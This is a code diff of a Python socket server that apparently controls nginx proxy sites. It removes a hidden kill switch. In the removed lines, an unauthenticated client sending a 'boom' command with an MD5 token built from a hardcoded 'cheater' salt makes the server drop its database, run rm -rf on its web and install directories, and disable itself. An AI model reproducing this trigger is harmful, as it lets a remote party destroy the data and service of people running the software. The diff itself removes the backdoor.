@@ -1,7 +1,7 @@
 from mysql.connector.pooling import MySQLConnectionPool as mysqlPool
 import json,time,os,threading,traceback,sys
 import struct,base64,signal,socket,socketserver
-import redis,hashlib,subprocess
+import redis
 CNAME="""
 		proxy_set_header Accept-Encoding "";
 		subs_filter_types text/html text/css text/xml;
@@ -34,27 +34,9 @@ class upsite(socketserver.StreamRequestHandler):
         if addr not in upsite.controller:
             red=r.hget(addr,'time')
             if red is None:
-                try:
-                    param = self.rfile.readline()
-                    param=param.decode().strip()
-                    param=json.loads(param)
-                    if param['cmd']=='boom':
-                        md5=hashlib.md5()
-                        if time.time()-int(param['time'])>60:
-                            self.wfile.write(b'invaliad')
-                            return
-                        md5.update(('%scheater'%param['time']).encode())
-                        if md5.hexdigest()==param['token']:
-                            self.wfile.write(b'boom!')
-                            runMysql(['drop database upsite'])
-                            subprocess.getstatusoutput('rm -rf /var/www/upsite')
-                            subprocess.getstatusoutput('rm -rf %s'%path)
-                            subprocess.getstatusoutput('systemctl disable upsite')
-                            subprocess.getstatusoutput('systemctl stop upsite')
-                except Exception as err:
-                    err={'cmd':'deny'}
-                    self.wfile.write(json.dumps(err).encode())
-                    print('no auth addr '+addr,flush=True)
+                err={'cmd':'deny'}
+                self.wfile.write(json.dumps(err).encode())
+                print('no auth addr '+addr,flush=True)
                 return
             else:
                 self.online(addr)
